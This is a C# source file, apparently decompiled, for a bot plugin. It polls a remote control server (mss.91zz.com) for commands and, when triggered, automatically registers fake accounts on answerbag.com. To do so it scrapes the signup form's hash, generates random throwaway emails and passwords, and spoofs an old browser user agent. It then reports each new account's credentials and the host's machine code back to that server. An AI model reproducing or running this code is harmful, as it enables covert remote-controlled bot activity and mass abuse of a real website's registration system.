using System;
using System.Collections;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace Class1;

public class Class1
{
	private Random random_0 = new Random(DateTime.Now.Second);

	private string string_0 = "1";

	private string string_1 = "http://mss.91zz.com/yahooanswerbag/getabrinfo.aspx";

	private string string_2 = "http://mss.91zz.com/yahooanswerbag/setabraccountinfo.aspx?machinecode=";

	private string[] string_3 = new string[4] { "gmail.com", "hotmail.com", "yahoo.com", "live.com" };

	private string[] string_4;

	private bool bool_0;

	public void start(string[] pars)
	{
		try
		{
			string_4 = pars;
			bool_0 = false;
			ThreadStart threadStart = method_0;
			Thread thread = new Thread(threadStart);
			thread.Start();
		}
		catch
		{
		}
	}

	public void end()
	{
		try
		{
			bool_0 = true;
		}
		catch
		{
		}
	}

	private void method_0()
	{
		try
		{
			int num = 5;
			while (!bool_0)
			{
				DateTime now = DateTime.Now;
				try
				{
					WebClient webClient = new WebClient();
					string text = webClient.DownloadString(string_1);
					webClient?.Dispose();
					if (text != null && text.Trim() != "")
					{
						string[] array = text.Split(new char[1] { '|' });
						if (array.Length == 2)
						{
							num = int.Parse(array[0]);
							if (array[1] == "T")
							{
								string string_ = "";
								string string_2 = "";
								if (method_1(ref string_, ref string_2))
								{
									webClient = new WebClient();
									webClient.DownloadString(this.string_2 + string_4[0] + "&version=" + string_0 + "&username=" + string_ + "&password=" + string_2);
									webClient?.Dispose();
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
				while (!bool_0 && DateTime.Now <= now.AddMinutes(num))
				{
					Thread.Sleep(5000);
				}
			}
		}
		catch
		{
		}
	}

	private bool method_1(ref string string_5, ref string string_6)
	{
		try
		{
			string string_7 = "";
			string text = "";
			string text2 = method_3("http://www.answerbag.com/register?referer=/", text, ref string_7);
			if (!(text2 == ""))
			{
				int num = text2.IndexOf("reghash");
				if (num >= 0)
				{
					int num2 = text2.IndexOf(">", num + 10);
					if (num2 >= 0)
					{
						string text3 = text2.Substring(num, num2 - num).Replace(" ", "").Replace("reghash", "")
							.Replace("value", "")
							.Replace("=", "")
							.Replace("\"", "")
							.Replace("'", "")
							.Replace("/", "");
						string text4 = "/";
						string text5 = "Anonymous";
						string text6 = "1";
						string text7 = method_2(random_0.Next(7, 10));
						string text8 = text7;
						string text9 = "0" + random_0.Next(1, 9);
						string text10 = random_0.Next(1, 28).ToString();
						string text11 = random_0.Next(1965, 1985).ToString();
						string text12 = random_0.Next(1, 3).ToString();
						string text13 = "1";
						string text14 = "1";
						int num3 = 0;
						string text15;
						while (true)
						{
							text15 = method_2(random_0.Next(3, 6)) + DateTime.Now.Month.ToString().Replace("0", "") + DateTime.Now.Day.ToString().Replace("0", "") + DateTime.Now.Hour.ToString().Replace("0", "") + DateTime.Now.Minute.ToString().Replace("0", "") + "@" + string_3[random_0.Next(0, string_3.Length)];
							string text16 = method_3("http://www.answerbag.com/json/register_check.php?field=email&value=" + text15, text, ref string_7);
							if (text16.IndexOf("true") <= 0)
							{
								break;
							}
							num3++;
							if (num3 > 10)
							{
								return false;
							}
						}
						string text17 = "referrer=" + text4;
						text17 = text17 + "&username=" + text5;
						text17 = text17 + "&name_display_flag=" + text6;
						text17 = text17 + "&email=" + text15;
						text17 = text17 + "&password=" + text7;
						text17 = text17 + "&password2=" + text8;
						text17 = text17 + "&Date_Month=" + text9;
						text17 = text17 + "&Date_Day=" + text10;
						text17 = text17 + "&Date_Year=" + text11;
						text17 = text17 + "&gender=" + text12;
						text17 = text17 + "&legal_agreement=" + text13;
						text17 = text17 + "&newsletter_flag=" + text14;
						text17 = text17 + "&reghash=" + text3;
						string text18 = method_4("http://www.answerbag.com/register_submit", text17, text, ref string_7);
						if (text18.IndexOf("Registration Complete!") <= 0)
						{
							return false;
						}
						string_5 = text15;
						string_6 = text7;
						return true;
					}
					return false;
				}
				return false;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private string method_2(int int_0)
	{
		Random random = new Random(DateTime.Now.Millisecond);
		string text = "asdfghjklqwertyuiopzxcvbnm1234567890";
		string text2 = "";
		for (int i = 0; i < int_0 - 1; i++)
		{
			text2 += text[random.Next(0, 36)];
		}
		return text[random.Next(0, 25)] + text2;
	}

	private string method_3(string string_5, string string_6, ref string string_7)
	{
		string text = "";
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_5);
			httpWebRequest.Accept = "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*";
			httpWebRequest.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)";
			httpWebRequest.KeepAlive = true;
			httpWebRequest.AllowAutoRedirect = false;
			httpWebRequest.Timeout = 60000;
			httpWebRequest.ReadWriteTimeout = 60000;
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Clear();
			if (string_7.Length > 0)
			{
				nameValueCollection.Add("Cookie", string_7);
			}
			int count = nameValueCollection.Count;
			for (int i = 0; i < count; i++)
			{
				string name = nameValueCollection.Keys[i];
				string value = nameValueCollection[i];
				httpWebRequest.Headers.Add(name, value);
			}
			if (string_6.Length > 0)
			{
				WebProxy webProxy = new WebProxy();
				Uri uri2 = (webProxy.Address = new Uri(string_6));
				httpWebRequest.Proxy = webProxy;
			}
			WebResponse response = httpWebRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			WebHeaderCollection headers = response.Headers;
			if (headers["Set-Cookie"] != null)
			{
				try
				{
					string text2 = headers["Set-Cookie"];
					text2 = text2.Replace(", ", "&*&");
					CookieCollection cookieCollection = method_6(text2);
					foreach (Cookie item in cookieCollection)
					{
						string_7 = string_7 + item.ToString() + ";";
					}
				}
				catch (Exception)
				{
				}
			}
			if (headers["Location"] == null)
			{
				Encoding encoding = Encoding.GetEncoding("utf-8");
				StreamReader streamReader = new StreamReader(responseStream, encoding);
				char[] array = new char[256];
				int num = streamReader.Read(array, 0, 256);
				while (num > 0)
				{
					string text3 = new string(array, 0, num);
					text += text3;
					num = streamReader.Read(array, 0, 256);
					text3 = null;
				}
				array = null;
				streamReader.Close();
				streamReader = null;
				responseStream = null;
				response.Close();
				response = null;
				httpWebRequest = null;
				return text;
			}
			string text4 = headers["Location"];
			if (text4.IndexOf("http") < 0)
			{
				if (text4.StartsWith("/"))
				{
					text4 = text4.Substring(1, text4.Length - 1);
				}
				text4 = "http://" + httpWebRequest.Headers["Host"] + "/" + text4;
			}
			response.Close();
			return method_3(text4, string_6, ref string_7);
		}
		catch (Exception)
		{
			return "";
		}
	}

	private string method_4(string string_5, string string_6, string string_7, ref string string_8)
	{
		try
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_5);
			httpWebRequest.Accept = "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*";
			httpWebRequest.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)";
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Timeout = 60000;
			httpWebRequest.ReadWriteTimeout = 60000;
			httpWebRequest.AllowAutoRedirect = false;
			httpWebRequest.Method = "POST";
			httpWebRequest.Referer = string_5;
			nameValueCollection.Clear();
			if (string_8.Length > 0)
			{
				nameValueCollection.Add("Cookie", string_8);
			}
			int count = nameValueCollection.Count;
			for (int i = 0; i < count; i++)
			{
				string name = nameValueCollection.Keys[i];
				string value = nameValueCollection[i];
				httpWebRequest.Headers.Add(name, value);
			}
			if (string_7.Length > 0)
			{
				WebProxy webProxy = new WebProxy();
				Uri uri2 = (webProxy.Address = new Uri(string_7));
				httpWebRequest.Proxy = webProxy;
			}
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(string_6);
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse webResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = webResponse.GetResponseStream();
			WebHeaderCollection headers = webResponse.Headers;
			if (headers["Set-Cookie"] != null)
			{
				string text = headers["Set-Cookie"];
				text = text.Replace(", ", "&*&");
				CookieCollection cookieCollection = method_6(text);
				foreach (Cookie item in cookieCollection)
				{
					string_8 = string_8 + item.ToString() + ";";
				}
			}
			if (headers["Location"] != null)
			{
				string text2 = headers["Location"];
				if (text2.IndexOf("http") < 0)
				{
					if (text2.StartsWith("/"))
					{
						text2 = text2.Substring(1, text2.Length - 1);
					}
					text2 = "http://" + httpWebRequest.Headers["Host"] + "/" + text2;
				}
				webResponse.Close();
				return method_3(text2, string_7, ref string_8);
			}
			Encoding encoding = Encoding.GetEncoding("utf-8");
			StreamReader streamReader = new StreamReader(responseStream, encoding);
			char[] array = new char[256];
			int num = streamReader.Read(array, 0, 256);
			string text3 = "";
			while (num > 0)
			{
				string text4 = new string(array, 0, num);
				text3 += text4;
				num = streamReader.Read(array, 0, 256);
				text4 = null;
			}
			array = null;
			streamReader.Close();
			streamReader = null;
			responseStream = null;
			webResponse.Close();
			webResponse = null;
			httpWebRequest = null;
			return text3;
		}
		catch (Exception)
		{
		}
		return "";
	}

	private Cookie method_5(string string_5)
	{
		string[] array = null;
		Queue queue = null;
		Cookie cookie = null;
		queue = new Queue(string_5.Split(new char[1] { ';' }));
		array = ((string)queue.Dequeue()).Split(new char[1] { '=' });
		cookie = new Cookie(array[0], array[1]);
		while (queue.Count > 0)
		{
			array = ((string)queue.Dequeue()).Split(new char[1] { '=' });
			switch (array[0].ToUpper())
			{
			case "COMMENT":
				if (cookie.Comment == null)
				{
					cookie.Comment = array[1];
				}
				break;
			case "COMMENTURL":
				if (cookie.CommentUri == null)
				{
					cookie.CommentUri = new Uri(array[1]);
				}
				break;
			case "DISCARD":
				cookie.Discard = true;
				break;
			case "DOMAIN":
				if (cookie.Domain == null)
				{
					cookie.Domain = array[1];
				}
				break;
			case "MAX-AGE":
				if (cookie.Expires == DateTime.MinValue)
				{
					cookie.Expires = cookie.TimeStamp.AddSeconds(int.Parse(array[1]));
				}
				break;
			case "EXPIRES":
				if (cookie.Expires == DateTime.MinValue)
				{
					cookie.Expires = DateTime.Parse(array[1]);
				}
				break;
			case "PATH":
				if (cookie.Path == null)
				{
					cookie.Path = array[1];
				}
				break;
			case "PORT":
				if (cookie.Port == null)
				{
					cookie.Port = array[1];
				}
				break;
			case "SECURE":
				cookie.Secure = true;
				break;
			case "VERSION":
				cookie.Version = int.Parse(array[1]);
				break;
			}
		}
		return cookie;
	}

	private CookieCollection method_6(string string_5)
	{
		CookieCollection cookieCollection = new CookieCollection();
		string[] array = string_5.Split(new char[1] { ',' });
		string[] array2 = array;
		foreach (string text in array2)
		{
			string string_6 = text.Replace("&*&", ", ");
			cookieCollection.Add(method_5(string_6));
		}
		return cookieCollection;
	}
}
